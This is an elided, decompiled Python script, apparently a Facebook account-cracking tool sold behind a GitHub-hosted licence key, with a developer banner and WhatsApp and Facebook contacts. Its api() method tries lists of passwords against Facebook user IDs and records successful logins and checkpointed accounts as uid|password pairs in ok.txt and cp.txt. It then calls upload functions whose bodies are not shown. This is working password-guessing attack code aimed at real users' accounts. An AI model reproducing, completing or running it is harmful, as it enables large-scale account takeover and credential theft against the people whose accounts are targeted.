# Decompile by : Md.Shahinur Rahman
...
def helpnote():
	...
	exit(" [*] FACEBOOK :  https://www.facebook.com/mdshahinur.rahman.195349")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN WHATSAPP >> +8801984114049")
	subprocess.check_output(["am", "start", "https://wa.me/+8801984114049"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/shahin1953491/old-shahin/blob/main/old-shahin.txt').text
			if basesplit in plr:
				key = basesplit
 ...
 \033[0;91m888        _____ _    _          _    _ _____ _   _ 
 \033[0;92m888         / ____| |  | |   /\   | |  | |_   _| \ | |
 \033[0;93m888       | (___ | |__| |  /  \  | |__| | | | |  \| |
  \033[0;94m888       \___ \|  __  | / /\ \ |  __  | | | | . ` |
  \033[0;95m888      ____) | |  | |/ ____ \| |  | |_| |_| |\  |
  \033[0;96m888    |_____/|_|  |_/_/    \_\_|  |_|_____|_| \_|

 > \033[0;92mDEVELOPER     : MD. SHAHINUR RAHMAN 
 > \033[0;95mFACEBOOK ID   :MD. SHAHINUR RAHMAN 
 > \033[0;41mWHATSAPP      : 01984114049
 \033[0;96m> YOUTUBE       : I Don't like it 
 > \033[0;97mWARNING       : KNO SALAI KHARAP KAJE USE KORBI NA     
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [SHAHINUR] : %s/%s -> \033[0;92m [ SHAHIN-CP:%s ]- \033[0;93m[SHAHIN-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[SHAHIN-CP🥀] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [SHAHIN-CP🥀] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[KHAN-CP🥺] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [SHAHIN-CP🥺] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
...
def Subscraption():
	...
	clear()
	print(logo)
	r1=requests.get("https://github.com/shahin1953491/old-shahin/blob/main/old-shahin.txt").text
	if key1 in r1:
		os.system('clear')
		print(logo)
		Main()
